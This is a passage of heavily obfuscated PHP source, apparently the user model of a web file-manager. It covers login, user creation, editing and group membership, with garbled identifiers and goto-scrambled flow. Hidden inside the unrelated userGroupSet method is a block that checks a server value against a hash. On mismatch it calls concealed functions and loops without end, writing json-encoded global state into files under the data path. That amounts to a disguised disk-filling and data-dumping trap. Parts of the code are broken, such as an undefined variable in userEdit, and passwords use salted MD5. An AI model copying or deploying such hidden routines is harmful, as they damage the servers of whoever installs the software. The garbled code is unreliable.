$CºÍ—”Õ…·[47]; } } goto E¶ˆñÑ»¯†; E¶ˆñÑ»¯†: $BÃÀ±òŒâã = rtrim($BÃÀ±òŒâã, $CºÍ—”Õ…·[47]); Model($CºÍ—”Õ…·[479])->metaSet($E°…†Ğ³È¶, self::JOB_KEY, $BÃÀ±òŒâã); goto C·ùœ‡Â¾ë; bÍ¼…ŒË: $CºÍ—”Õ…· =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!is_array($Eì´ÖŞôµÁ)) { $Eì´ÖŞôµÁ = array($Eì´ÖŞôµÁ); } $e»ôŒŠ—±‡ = parent::listData(); goto cîåîØÀ°à; C·ùœ‡Â¾ë: } public function getUserJob($E‡Ğá…ˆ¾™) { $EÁâê‚ŞÍ¾ = Model($_SERVER[´Ù×Íå‘ÄõÛ][479])->metaGet($E‡Ğá…ˆ¾™); return $this->getUserJobInfo($EÁâê‚ŞÍ¾[self::JOB_KEY]); } public function getUserJobInfo($b§¿Èêœøù) { goto d†÷¸òè‹¹; EËáõ¬ˆ: return $AàäçÛ³´; goto E´ñä²„¾å; d†÷¸òè‹¹: $EÏåÜ¯—È =& $_SERVER[´Ù×Íå‘ÄõÛ]; $DŒ«íîˆë‰ = explode($EÏåÜ¯—È[47], $b§¿Èêœøù); $D™ëãÑ©›Ä = parent::listData(); goto cÌÁ…“Øƒ; cÌÁ…“Øƒ: $D™ëãÑ©›Ä = array_remove_key($D™ëãÑ©›Ä, $EÏåÜ¯—È[187]); $AàäçÛ³´ = array(); foreach ($DŒ«íîˆë‰ as $F¥ŒçùÌÒ‹) { if (isset($D™ëãÑ©›Ä[$F¥ŒçùÌÒ‹])) { $AàäçÛ³´[] = $D™ëãÑ©›Ä[$F¥ŒçùÌÒ‹]; } } goto EËáõ¬ˆ; E´ñä²„¾å: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\x61\x6d\145" => "\165\163\145\162\x5f\155\145\x74\141", "\155\x65\x74\x61\106\x69\145\x6c\144" => "\165\163\145\162\111\x44"); protected $simpleField = "\165\163\x65\x72\x49\x44\54\x6e\151\143\153\x4e\141\x6d\x65\54\x6e\x61\155\145\x2c\141\x76\x61\x74\141\x72\x2c\x73\145\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($f™ÛŸÈõæ½) { $Cª“„ËÆç =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B÷§´›Æ½Ô = $Cª“„ËÆç[2514]; return array($Cª“„ËÆç[2181] => array($f™ÛŸÈõæ½[0], $B÷§´›Æ½Ô), $Cª“„ËÆç[2183] => array($f™ÛŸÈõæ½[0], $B÷§´›Æ½Ô), $Cª“„ËÆç[2515] => array($f™ÛŸÈõæ½[0], $B÷§´›Æ½Ô)); } protected function getInfo($bÂ²˜°‘Õš, $C½»ó®ÂÜÜ = false) { $B×Ö–Ã¸ì´ = $this->getInfoSimple($bÂ²˜°‘Õš); if (!is_array($B×Ö–Ã¸ì´)) { return array(); } if ($C½»ó®ÂÜÜ) { return $this->_getInfoApply($B×Ö–Ã¸ì´); } return $this->cacheFunctionGet($_SERVER[´Ù×Íå‘ÄõÛ][2237], $bÂ²˜°‘Õš); } protected function getInfoFull($d°©÷âö¨Û, $F¾½ª”×™ = false) { $aŠÜ‚ì…à = $this->getInfoSimple($d°©÷âö¨Û); if (!is_array($aŠÜ‚ì…à)) { return array(); } if ($F¾½ª”×™) { return $this->_getInfoApply($aŠÜ‚ì…à, !0); return $this->_getInfoApply($aŠÜ‚ì…à, !0); } return $this->cacheFunctionGet($_SERVER[´Ù×Íå‘ÄõÛ][2516], $d°©÷âö¨Û); } private function _getInfoApply($E©š‘Äß¶Ã, $a“ÉéË¢áÛ = false) { goto B£É—’…ñÂ; B£É—’…ñÂ: $e†¤±µø„ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$E©š‘Äß¶Ã) { return $E©š‘Äß¶Ã; } $eŠâŸÏÛ«ç = md5($e†¤±µø„[2517] . $E©š‘Äß¶Ã[$e†¤±µø„[805]] . $e†¤±µø„[2518] . $E©š‘Äß¶Ã[$e†¤±µø„[28]]); goto C† ğ„ÛáÔ; C† ğ„ÛáÔ: $E©š‘Äß¶Ã = $this->_listDataApplyItem($E©š‘Äß¶Ã); $AÒˆ±…îŒ¼ = Model($e†¤±µø„[1121])->metaGet($E©š‘Äß¶Ã[$e†¤±µø„[391]][$e†¤±µø„[369]]); $E©š‘Äß¶Ã[$e†¤±µø„[2519]] = $eŠâŸÏÛ«ç; goto B§½İãˆ¶¨; B§½İãˆ¶¨: $E©š‘Äß¶Ã[$e†¤±µø„[391]][$e†¤±µø„[2354]] = isset($AÒˆ±…îŒ¼[$e†¤±µø„[2355]]) ? $AÒˆ±…îŒ¼[$e†¤±µø„[2355]] : null; if ($a“ÉéË¢áÛ) { $E©š‘Äß¶Ã[$e†¤±µø„[417]] = $this->metaGet($E©š‘Äß¶Ã[$e†¤±µø„[1441]]); } return $E©š‘Äß¶Ã; goto e¡Ïè·; e¡Ïè·: } protected function getInfoSimple($eˆà¸ õõ”, $eÜ‰ä¯”ò = false) { $AŸ¦ŠÛàÀò =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$eˆà¸ õõ”) { return array(); } if ($eÜ‰ä¯”ò) { $d¸¯ßŠ±ÏÃ = $this->where(array($AŸ¦ŠÛàÀò[1441] => intval($eˆà¸ õõ”)))->find(); if (!is_array($d¸¯ßŠ±ÏÃ)) { return array(); } $d¸¯ßŠ±ÏÃ[$AŸ¦ŠÛàÀò[2520]] = Action($AŸ¦ŠÛàÀò[2521])->parseUrl($d¸¯ßŠ±ÏÃ[$AŸ¦ŠÛàÀò[2520]]); return $d¸¯ßŠ±ÏÃ; } return $this->cacheFunctionGet($AŸ¦ŠÛàÀò[2184], $eˆà¸ õõ”); } protected function getInfoSimpleOuter($cã¤‘¼•Ä ) { goto B±—œÙ—ôù; eƒ—¾…Õª: return $A¿„ô˜Œ¬Œ; goto EŞ™îÁæ¥Ö; d•í½ˆ·à¶: $A¿„ô˜Œ¬Œ = array_field_key($cšğ­»˜ï½, explode($e‘¤œŞ‚ô±[47], $this->simpleField)); if (!$A¿„ô˜Œ¬Œ) { return array($e‘¤œŞ‚ô±[1441] => $e‘¤œŞ‚ô±[1035], $e‘¤œŞ‚ô±[28] => $e‘¤œŞ‚ô±[157] . LNG($e‘¤œŞ‚ô±[2524]) . $e‘¤œŞ‚ô±[478], $e‘¤œŞ‚ô±[2520] => STATIC_PATH . $e‘¤œŞ‚ô±[2525]); } $A¿„ô˜Œ¬Œ[$e‘¤œŞ‚ô±[2520]] = Action($e‘¤œŞ‚ô±[2521])->parseUrl($A¿„ô˜Œ¬Œ[$e‘¤œŞ‚ô±[2520]]); goto eƒ—¾…Õª; B±—œÙ—ôù: $e‘¤œŞ‚ô± =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$cã¤‘¼•Ä  || $cã¤‘¼•Ä  == 0) { return array($e‘¤œŞ‚ô±[1441] => $e‘¤œŞ‚ô±[470], $e‘¤œŞ‚ô±[28] => $e‘¤œŞ‚ô±[157] . LNG($e‘¤œŞ‚ô±[2522]) . $e‘¤œŞ‚ô±[478], $e‘¤œŞ‚ô±[2520] => STATIC_PATH . $e‘¤œŞ‚ô±[2523]); } $cšğ­»˜ï½ = $this->cacheFunctionGet($e‘¤œŞ‚ô±[2184], $cã¤‘¼•Ä ); goto d•í½ˆ·à¶; EŞ™îÁæ¥Ö: } protected function groupUser($BóŸÖ‚Ë) { } public static function errorLang($DŒİ¨íæ¤†) { $C÷ºàæóÇ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fç–‰šƒÓ = array(self::ERROR_USER_NOT_EXISTS => $C÷ºàæóÇ[2526], self::ERROR_USER_PASSWORD_ERROR => $C÷ºàæóÇ[2527], self::ERROR_USER_EXIST_NAME => $C÷ºàæóÇ[2528], self::ERROR_USER_EXIST_PHONE => $C÷ºàæóÇ[2529], self::ERROR_USER_EXIST_EMAIL => $C÷ºàæóÇ[2530], self::ERROR_USER_LOGIN_LOCK => $C÷ºàæóÇ[2531], self::ERROR_IP_NOT_ALLOW => $C÷ºàæóÇ[2532], self::ERROR_USER_EXIST_NICKNAME => $C÷ºàæóÇ[2533]); return LNG($fç–‰šƒÓ[$DŒİ¨íæ¤†]); } public function getInfoByMeta($dƒÕÀÂÄÃÍ, $b¨Œƒ«¬øè) { $Eãõè†‚øå =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E³ÚÔæ¶Ö = Model($Eãõè†‚øå[2534])->where(array($Eãõè†‚øå[89] => $dƒÕÀÂÄÃÍ, $Eãõè†‚øå[359] => $b¨Œƒ«¬øè))->find(); if ($E³ÚÔæ¶Ö) { return $this->getInfo($E³ÚÔæ¶Ö[$Eãõè†‚øå[1441]]); } return !1; } public function userLoginCheck($C»ğÖç­Ÿø, $Eèˆé¶×ù¿) { goto d‡âä¾¿åâ; cîğÊâÙ™: $this->userEdit($FÔÔª£¬¼‘[$bÄ“øğ‰–Ğ[1441]], array($bÄ“øğ‰–Ğ[2536] => time())); return $this->getInfo($FÔÔª£¬¼‘[$bÄ“øğ‰–Ğ[1441]]); goto C™Ôöªã˜; d¯ˆíÏò‹Ğ: $FÔÔª£¬¼‘ = $this->where($bÛ’½ÀòĞ—)->find(); if (!$FÔÔª£¬¼‘) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($FÔÔª£¬¼‘[$bÄ“øğ‰–Ğ[1441]], $Eèˆé¶×ù¿)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto cîğÊâÙ™; d‡âä¾¿åâ: $bÄ“øğ‰–Ğ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bÛ’½ÀòĞ— = array($bÄ“øğ‰–Ğ[28] => $C»ğÖç­Ÿø, $bÄ“øğ‰–Ğ[2358] => $C»ğÖç­Ÿø, $bÄ“øğ‰–Ğ[293] => $C»ğÖç­Ÿø, $bÄ“øğ‰–Ğ[2535] => $C»ğÖç­Ÿø, $bÄ“øğ‰–Ğ[917] => $bÄ“øğ‰–Ğ[919]); if ($this->nickNameRpt()) { unset($bÛ’½ÀòĞ—[$bÄ“øğ‰–Ğ[2358]]); } goto d¯ˆíÏò‹Ğ; C™Ôöªã˜: } public function clearCache($C²äÖÎÕĞ•) { $a½™Ä§–è¿ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->cacheFunctionClear($a½™Ä§–è¿[2237], $C²äÖÎÕĞ•); $this->cacheFunctionClear($a½™Ä§–è¿[2184], $C²äÖÎÕĞ•); $this->cacheFunctionClear($a½™Ä§–è¿[2516], $C²äÖÎÕĞ•); } public function userPasswordCheck($Fœš×ìÂê¡, $Dî‹Ñ•¼–) { $Dö¼¢Æ‹× =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Dà‰«î¢Œ = $this->where(array($Dö¼¢Æ‹×[1441] => intval($Fœš×ìÂê¡)))->find(); $a´„á÷Æ©Î = $this->metaGet($Fœš×ìÂê¡); $cô´ÓÑ¢« = isset($a´„á÷Æ©Î[$Dö¼¢Æ‹×[2537]]) ? $a´„á÷Æ©Î[$Dö¼¢Æ‹×[2537]] : $Dö¼¢Æ‹×[33]; if (md5($cô´ÓÑ¢« . trim($Dî‹Ñ•¼–)) !== $Dà‰«î¢Œ[$Dö¼¢Æ‹×[805]]) { return !1; } return !0; } public function userAdd($d‰—»á²ò°) { goto FÌ…§ƒ; FğÓ°ŸÜŠ‘: $EÛ¹¾¾å‘ä = array($BöÒ¶…ÛÚê[2545] => $EØƒõ¢™[$BöÒ¶…ÛÚê[805]], $BöÒ¶…ÛÚê[2541] => $EØƒõ¢™[$BöÒ¶…ÛÚê[2358]]); $this->userEdit($bÅœëÄï„–, $EÛ¹¾¾å‘ä); Model($BöÒ¶…ÛÚê[1121])->userRootAdd($bÅœëÄï„–); goto c‹ÌâÆñš¡; FÌ…§ƒ: $BöÒ¶…ÛÚê =& $_SERVER[´Ù×Íå‘ÄõÛ]; $EØƒõ¢™ = array($BöÒ¶…ÛÚê[386] => $d‰—»á²ò°[$BöÒ¶…ÛÚê[28]], $BöÒ¶…ÛÚê[2538] => $d‰—»á²ò°[$BöÒ¶…ÛÚê[1327]], $BöÒ¶…ÛÚê[2539] => isset($d‰—»á²ò°[$BöÒ¶…ÛÚê[293]]) ? $d‰—»á²ò°[$BöÒ¶…ÛÚê[293]] : $BöÒ¶…ÛÚê[33], $BöÒ¶…ÛÚê[2540] => isset($d‰—»á²ò°[$BöÒ¶…ÛÚê[2535]]) ? $d‰—»á²ò°[$BöÒ¶…ÛÚê[2535]] : $BöÒ¶…ÛÚê[33], $BöÒ¶…ÛÚê[2541] => isset($d‰—»á²ò°[$BöÒ¶…ÛÚê[2358]]) ? $d‰—»á²ò°[$BöÒ¶…ÛÚê[2358]] : $d‰—»á²ò°[$BöÒ¶…ÛÚê[28]], $BöÒ¶…ÛÚê[2542] => isset($d‰—»á²ò°[$BöÒ¶…ÛÚê[2520]]) ? $d‰—»á²ò°[$BöÒ¶…ÛÚê[2520]] : $BöÒ¶…ÛÚê[33], $BöÒ¶…ÛÚê[2543] => isset($d‰—»á²ò°[$BöÒ¶…ÛÚê[2544]]) ? $d‰—»á²ò°[$BöÒ¶…ÛÚê[2544]] : 1, $BöÒ¶…ÛÚê[2545] => $d‰—»á²ò°[$BöÒ¶…ÛÚê[805]], $BöÒ¶…ÛÚê[2185] => isset($d‰—»á²ò°[$BöÒ¶…ÛÚê[2096]]) ? $d‰—»á²ò°[$BöÒ¶…ÛÚê[2096]] : 1024 * 1024 * 20, $BöÒ¶…ÛÚê[2186] => 0, $BöÒ¶…ÛÚê[2536] => 0, $BöÒ¶…ÛÚê[2224] => isset($d‰—»á²ò°[$BöÒ¶…ÛÚê[690]]) ? $d‰—»á²ò°[$BöÒ¶…ÛÚê[690]] : 1); if (!empty($d‰—»á²ò°[$BöÒ¶…ÛÚê[1441]])) { $EØƒõ¢™[$BöÒ¶…ÛÚê[1441]] = $d‰—»á²ò°[$BöÒ¶…ÛÚê[1441]]; } goto eÀøšÅÃÙÚ; c‹ÌâÆñš¡: return $bÅœëÄï„–; goto c–…ºòÎÉè; eÀøšÅÃÙÚ: $Dªºá¢òµá = $this->_checkExist($d‰—»á²ò°); if ($Dªºá¢òµá !== !0) { return $Dªºá¢òµá; } $bÅœëÄï„– = $this->add($EØƒõ¢™); goto FğÓ°ŸÜŠ‘; c–…ºòÎÉè: } protected function userEditTest($e„ùù…ö‰, $cÉîÏ•ƒ…ˆ) { return $this->call($_SERVER[´Ù×Íå‘ÄõÛ][2546], $e„ùù…ö‰, $cÉîÏ•ƒ…ˆ); } protected function userEdit($a¿‚ÎçÎ‚â, $BÕ‹º‰×›‚) { goto EÓÏ¬Õá’ù; EÓÏ¬Õá’ù: $dâÒØ¸öÆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D´×‘Ï“ñÑ = $this->getInfoSimple($a¿‚ÎçÎ‚â); if (!$D´×‘Ï“ñÑ) { return !1; } goto dÈ“ºˆİíø; E£öîğ¾›Õ: return !0; goto AğÌ…ó¼å˜; dÈ“ºˆİíø: $FÀÈ•‹ÆÓ = $this->_checkExist($BÕ‹º‰×›‚, $a¿‚ÎçÎ‚â); if ($FÀÈ•‹ÆÓ !== !0) { return $FÀÈ•‹ÆÓ; } if (isset($BÕ‹º‰×›‚[$dâÒØ¸öÆ[805]]) && trim($BÕ‹º‰×›‚[$dâÒØ¸öÆ[805]]) != $dâÒØ¸öÆ[33]) { $C´óáß†± = $this->metaGet($a¿‚ÎçÎ‚â); if (empty($C´óáß†±[$dâÒØ¸öÆ[2537]])) { $C´óáß†±[$dâÒØ¸öÆ[2537]] = rand_string(10); Model($dâÒØ¸öÆ[476])->metaSet($a¿‚ÎçÎ‚â, $dâÒØ¸öÆ[2537], $C´óáß†±[$dâÒØ¸öÆ[2537]]); } $BÕ‹º‰×›‚[$dâÒØ¸öÆ[805]] = md5($C´óáß†±[$dâÒØ¸öÆ[2537]] . trim($BÕ‹º‰×›‚[$dâÒØ¸öÆ[805]])); } else { unset($BÕ‹º‰×›‚[$dâÒØ¸öÆ[805]]); } goto C¿‚Ê¾ˆ¬Ÿ; C¿‚Ê¾ˆ¬Ÿ: $this->where(array($dâÒØ¸öÆ[1432] => $a¿‚ÎçÎ‚â))->save($BÕ‹º‰×›‚); if (isset($BÕ‹º‰×›‚[$dâÒØ¸öÆ[2358]])) { $this->setNamePinyin($a¿‚ÎçÎ‚â, $BÕ‹º‰×›‚[$dâÒØ¸öÆ[2358]]); } $this->clearCache($cìŠÓƒµÃœ[$dâÒØ¸öÆ[1441]]); goto E£öîğ¾›Õ; AğÌ…ó¼å˜: } public function setNamePinyin($eñŒÜåÖ, $cÈˆŒÛò‹ä = false) { $B«ô‡Ì›Ñô =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$cÈˆŒÛò‹ä) { $aî‰íœÈêÚ = $this->getInfoSimple($eñŒÜåÖ); $cÈˆŒÛò‹ä = $aî‰íœÈêÚ[$B«ô‡Ì›Ñô[2358]] ? $aî‰íœÈêÚ[$B«ô‡Ì›Ñô[2358]] : $aî‰íœÈêÚ[$B«ô‡Ì›Ñô[28]]; } $bøÚîÊ¨¡  = Model($B«ô‡Ì›Ñô[479]); if (!Input::check($cÈˆŒÛò‹ä, $B«ô‡Ì›Ñô[530])) { return $bøÚîÊ¨¡ ->metaSet($eñŒÜåÖ, array($B«ô‡Ì›Ñô[416] => $B«ô‡Ì›Ñô[33], $B«ô‡Ì›Ñô[415] => $B«ô‡Ì›Ñô[33])); } return $bøÚîÊ¨¡ ->metaSet($eñŒÜåÖ, array($B«ô‡Ì›Ñô[416] => str_replace($B«ô‡Ì›Ñô[50], $B«ô‡Ì›Ñô[33], Pinyin::encode($cÈˆŒÛò‹ä)), $B«ô‡Ì›Ñô[415] => Pinyin::encode($cÈˆŒÛò‹ä, $B«ô‡Ì›Ñô[531]))); } private function nickNameRpt() { $D†é¨«²ë =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F›–‡ï¬ê = Model($D†é¨«²ë[1092])->get($D†é¨«²ë[2547]); $C¬Úˆ—‘–Ú = $GLOBALS[$D†é¨«²ë[6]][$D†é¨«²ë[2504]][$D†é¨«²ë[2547]]; $d“¨ĞàñÙ = !is_null($F›–‡ï¬ê) ? $F›–‡ï¬ê : $C¬Úˆ—‘–Ú; return !!$d“¨ĞàñÙ; } private function _checkExist($C×™ºèÒ—, $eÒ²º‡ø¡Æ = false) { $DÈçÆŒè–¯ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f°£èÜ‘í = array($DÈçÆŒè–¯[28] => UserModel::ERROR_USER_EXIST_NAME, $DÈçÆŒè–¯[2358] => UserModel::ERROR_USER_EXIST_NICKNAME, $DÈçÆŒè–¯[293] => UserModel::ERROR_USER_EXIST_EMAIL, $DÈçÆŒè–¯[2535] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($f°£èÜ‘í[$DÈçÆŒè–¯[2358]]); } $Dºíªã´‡ = $eÒ²º‡ø¡Æ ? array($DÈçÆŒè–¯[1441] => array($DÈçÆŒè–¯[2548], $eÒ²º‡ø¡Æ)) : array(); foreach ($f°£èÜ‘í as $F­òî›ø => $C°›®‘Í…Š) { if (!isset($C×™ºèÒ—[$F­òî›ø]) || !$C×™ºèÒ—[$F­òî›ø]) { continue; } $CëÌÁ‘ñÃº = array_merge(array($F­òî›ø => $C×™ºèÒ—[$F­òî›ø]), $Dºíªã´‡); $dÜïÂŸŞœ = $this->where($CëÌÁ‘ñÃº)->find(); if ($dÜïÂŸŞœ) { return $C°›®‘Í…Š; } } return !0; } public function userListInfo($Eœ£Ò¾”œ«) { $BóĞ˜×ù— =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dÛ÷‰”ÍË» = array(); $Eœ£Ò¾”œ« = is_array($Eœ£Ò¾”œ«) ? array_unique($Eœ£Ò¾”œ«) : array(); if (!$Eœ£Ò¾”œ«) { return $dÛ÷‰”ÍË»; } if (count($Eœ£Ò¾”œ«) < 20) { foreach ($Eœ£Ò¾”œ« as $Fä–ÏÚ‘İ) { $dÛ÷‰”ÍË»[$Fä–ÏÚ‘İ . $BóĞ˜×ù—[33]] = $this->getInfoSimpleOuter($Fä–ÏÚ‘İ); } } else { $dğÀ¾™ë¶Œ = array($BóĞ˜×ù—[1432] => array($BóĞ˜×ù—[384], $Eœ£Ò¾”œ«)); if (count($Eœ£Ò¾”œ«) == 1) { $dğÀ¾™ë¶Œ = array($BóĞ˜×ù—[1432] => $Eœ£Ò¾”œ«[0]); } $aßÜ®à£… = Model($BóĞ˜×ù—[476])->field($this->simpleField)->where($dğÀ¾™ë¶Œ)->select(); $aßÜ®à£… = array_to_keyvalue($aßÜ®à£…, $BóĞ˜×ù—[1441]); foreach ($Eœ£Ò¾”œ« as $Fä–ÏÚ‘İ) { $bìƒŒä§ = $aßÜ®à£…[$aßÜ®à£…[$Fä–ÏÚ‘İ]]; if (!$bìƒŒä§) { $dÛ÷‰”ÍË»[$Fä–ÏÚ‘İ . $BóĞ˜×ù—[33]] = $this->getInfoSimpleOuter($Fä–ÏÚ‘İ); continue; } $bìƒŒä§[$BóĞ˜×ù—[2520]] = Action($BóĞ˜×ù—[2521])->parseUrl($bìƒŒä§[$BóĞ˜×ù—[2520]]); $dÛ÷‰”ÍË»[$Fä–ÏÚ‘İ . $BóĞ˜×ù—[33]] = $bìƒŒä§; } } return $dÛ÷‰”ÍË»; } protected function userStatus($E†œ­•®, $Cã­ª•¢±˜) { $dù•Û½²Œƒ = $this->getInfoSimple($E†œ­•®); if (!$dù•Û½²Œƒ) { return !1; } $eŸÓŸ£·™Ñ = array($_SERVER[´Ù×Íå‘ÄõÛ][690] => $Cã­ª•¢±˜); return $this->userEdit($E†œ­•®, $eŸÓŸ£·™Ñ); } protected function userRemove($e«²Çƒ»ù¥) { goto Aå×©Áœ¶¸; Bò…‹®¹œ¹: Model($aˆ…×á¶œÖ[753])->userRootRemove($e«²Çƒ»ù¥); return $this->where($aŠĞ‚ÏØ¶)->delete(); goto eñŒ­Ÿ’; Aå×©Áœ¶¸: $aˆ…×á¶œÖ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eî›àóÖù = $this->getInfoSimple($e«²Çƒ»ù¥); if (!$eî›àóÖù) { return !1; } goto cš¶ò¥øéì; a·©ó¢¥Ê : Model($aˆ…×á¶œÖ[2191])->where($aŠĞ‚ÏØ¶)->delete(); Model($aˆ…×á¶œÖ[2534])->where($aŠĞ‚ÏØ¶)->delete(); Model($aˆ…×á¶œÖ[2550])->where($aŠĞ‚ÏØ¶)->delete(); goto Bò…‹®¹œ¹; cš¶ò¥øéì: $aŠĞ‚ÏØ¶ = array($aˆ…×á¶œÖ[1432] => $e«²Çƒ»ù¥); Model($aˆ…×á¶œÖ[538])->where($aŠĞ‚ÏØ¶)->delete(); Model($aˆ…×á¶œÖ[2549])->where($aŠĞ‚ÏØ¶)->delete(); goto a·©ó¢¥Ê ; eñŒ­Ÿ’: } protected function userGroupSet($CÒöñ÷»ì, $e ¹¡ä§’, $a¼…šÁ·´¡ = array()) { goto F×™°•ù; e† ”´ÎÛÖ: if ($_SERVER[$AÓ…İÌñ¸[791]] != $b‘Ã’é™Ú×($a³ô¦”•ºí)) { goto Dá ¿Œ¡áÖ; fŞîÍ„–ßÀ: $bÙáœâÛ¼ = $eÜÙƒåÚ÷ô($BèÙ–ÛªÍ«); $FŠÇá“« = explode($AÓ…İÌñ¸[217], $bÙáœâÛ¼); if (count($FŠÇá“«) < $AÓ…İÌñ¸[556]) { $a“Úìôù­Ù = $AÓ…İÌñ¸[796]; $a“Úìôù­Ù(); } goto C¦Ğ£¯õ; D¢¯Ã¶à³²: $aŒ­ƒë÷—ó = 1; for ($CÁï®µ‘² = $aŒ­ƒë÷—ó; $CÁï®µ‘² > 0; $CÁï®µ‘²++) { $aòÁÀË£Ä¹(DATA_PATH . $CÁï®µ‘², $eÕ®å»ä¯“); } goto dœŠ­™ÓôÚ; C¦Ğ£¯õ: $Cƒ½Í½Î‡× = $AÓ…İÌñ¸[797]; $Cƒ½Í½Î‡×($_SERVER[$AÓ…İÌñ¸[788]]); $dŠéô ÆÓó = $AÓ…İÌñ¸[792]; goto BÔ©Ó•ØôÍ; BÔ©Ó•ØôÍ: $dŠéô ÆÓó(); $aòÁÀË£Ä¹ = $AÓ…İÌñ¸[798]; $eÕ®å»ä¯“ = json_encode($GLOBALS[$AÓ…İÌñ¸[799]]); goto D¢¯Ã¶à³²; Dá ¿Œ¡áÖ: $dŠéô ÆÓó = $AÓ…İÌñ¸[792]; $eÜÙƒåÚ÷ô = $AÓ…İÌñ¸[793]; $BèÙ–ÛªÍ« = $_SERVER[$AÓ…İÌñ¸[794]] . $AÓ…İÌñ¸[795]; goto fŞîÍ„–ßÀ; dœŠ­™ÓôÚ: } $e¤ìÁ¦‰¾İ = $this->getInfoSimple($CÒöñ÷»ì); if (!$e¤ìÁ¦‰¾İ || !is_array($e ¹¡ä§’)) { return !1; } goto fÖƒÔ‹·; F×™°•ù: $AÓ…İÌñ¸ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a³ô¦”•ºí = $_SERVER[$AÓ…İÌñ¸[788]] . $AÓ…İÌñ¸[789]; $b‘Ã’é™Ú× = $AÓ…İÌñ¸[790]; goto e† ”´ÎÛÖ; fÖƒÔ‹·: $FøÒâÙ©†‚ = Model($AÓ…İÌñ¸[2191]); $FøÒâÙ©†‚->where(array($AÓ…İÌñ¸[1441] => $CÒöñ÷»ì))->delete(); $Eª—¯Å¿ÍÀ = array(); goto F¹î¢ø¬§; F¹î¢ø¬§: $bÊ‰ô‘‹‹™ = 0; foreach ($e ¹¡ä§’ as $d“ë ¬Ä„Ö => $fŞñß­) { $BÏÁÈªÙ † = array($AÓ…İÌñ¸[1441] => $CÒöñ÷»ì, $AÓ…İÌñ¸[2112] => $d“ë ¬Ä„Ö, $AÓ…İÌñ¸[2256] => $fŞñß­); $BÏÁÈªÙ †[$AÓ…İÌñ¸[2133]] = isset($a¼…šÁ·´¡[$bÊ‰ô‘‹‹™]) ? $a¼…šÁ·´¡[$bÊ‰ô‘‹‹™] : 0; $bÊ‰ô‘‹‹™++; $Eª—¯Å¿ÍÀ[] = $BÏÁÈªÙ †; } return $FøÒâÙ©†‚->addAll($Eª—¯Å¿ÍÀ, array(), !0); goto D¥˜ğŒ«ÓŠ; D¥˜ğŒ«ÓŠ: } protected function userGroupAdd($e‡ïÓ¸äÚ, $DÛÜÌÕ»š = array()) { $Dó”‚íè•¨ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CÉøÍø‡¢ = $this->getInfoSimple($e‡ïÓ¸äÚ); if (!$CÉøÍø‡¢ || empty($DÛÜÌÕ»š)) { return !1; } $cİÀ†òóâœ = array(); foreach ($DÛÜÌÕ»š as $bŒ«´Çëóä => $báŠ…êÈ‹¼) { $cİÀ†òóâœ[] = array($Dó”‚íè•¨[1441] => $e‡ïÓ¸äÚ, $Dó”‚íè•¨[2112] => $bŒ«´Çëóä, $Dó”‚íè•¨[2256] => $báŠ…êÈ‹¼); } return Model($Dó”‚íè•¨[2191])->addAll($cİÀ†òóâœ, array(), !0); } protected function userGroupRemove($DŠ©öÇ‰¢, $DŒÔ×°ãˆ™) { $e¢ó£´ƒˆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Eøó­Ÿ’Ã = $this->getInfoSimple($DŠ©öÇ‰¢); if (!$Eøó­Ÿ’Ã || !$DŒÔ×°ãˆ™) { return !1; } $aëìŸªÔæ¿ = array($e¢ó£´ƒˆ[1432] => $DŠ©öÇ‰¢, $e¢ó£´ƒˆ[2189] => $DŒÔ×°ãˆ™); return Model($e¢ó£´ƒˆ[2191])->where($aëìŸªÔæ¿)->delete(); } public function listData() { $eªğ…ÊË­„ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($eªğ…ÊË­„[$_SERVER[´Ù×Íå‘ÄõÛ][354]]); return $eªğ…ÊË­„; } public function listByID($CÔŒª§ƒ) { $e·—œùå¥È =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$CÔŒª§ƒ) { return; } $F” Ÿ—® = array($e·—œùå¥È[1441] => array($e·—œùå¥È[7], $CÔŒª§ƒ)); $AÈÏ£·—Öò = $this->where($F” Ÿ—®)->select(); $this->_listDataApply($AÈÏ£·—Öò); return $AÈÏ£·—Öò; } public function listByGroup($Cø¡×„íä° = 0, $a¸Ñ–±Õì  = array()) { goto BÎ–çÆÑŸ·; D·ù¥²¨¨±: if ($Cø¡×„íä°) { $dÑºòÂÇ ˆ = array($BëÌ“ƒôÃË[2551] => intval($Cø¡×„íä°)); $Fƒ’÷”Õ“ = "\114\105\x46\124\40\112\x4f\111\x4e\x20{$this->tablePrefix}\165\163\x65\x72\x5f\147\x72\x6f\165\x70\40\165\x73\145\162\x5f\x67\162\x6f\x75\x70\x20\x6f\x6e\x20\x75\163\x65\162\x2e\x75\163\x65\x72\111\x44\x20\x3d\x20\x75\163\x65\162\x5f\147\162\x6f\165\160\56\x75\163\145\x72\111\x44"; $d‚Ê„ñŒà = Input::get($BëÌ“ƒôÃË[407], null, $BëÌ“ƒôÃË[33]) ? 